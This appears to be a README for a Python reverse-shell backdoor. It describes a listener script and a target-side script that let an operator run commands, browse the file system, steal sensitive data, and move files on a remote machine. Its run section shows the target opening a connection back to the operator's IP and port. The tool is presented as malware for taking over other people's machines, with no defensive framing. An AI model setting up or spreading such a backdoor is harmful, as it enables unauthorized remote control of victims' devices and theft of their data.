# Reverse Backdoor

## Description
A backdoor is program/malware which gives us remote access to target device. This tool is for reverse shell access, which allows us remotely control target machine, crawl in its system, steal sensitive data, execute commands, upload or download files. 

<p align="center">
  <img src="https://user-images.githubusercontent.com/53910160/231488656-b244641b-80e1-477e-9e02-3afa7754af9d.png" />
</p>

## Usage

| Command | Description |
| --- | --- |
| `[command]` | Executes command on target machine |
| `cd [dir]`  | Change directories and crawl in target system |
| `download [file]` | Download files from target machine to yours |
| `upload [file]` | Upload files from your to target machine |

I am going to add more advanced features later :)

### Requirements
Python v3

## Run

```sh
# On your machine:
$ python listener.py --ip <your_ip> --port <port_number>

# On target machine:
$ python reverse_backdoor.py --ip <your_ip> --port <same_port>
```

## Manual

Listener:
![listener](https://user-images.githubusercontent.com/53910160/231488439-0ff14e60-61ca-4403-8a1f-3e04d1f92e60.png)

Reverse Backdoor:
![reverse_backdoor](https://user-images.githubusercontent.com/53910160/231488522-f8782e1f-c296-4741-8a9f-46ea59be1fa0.png)
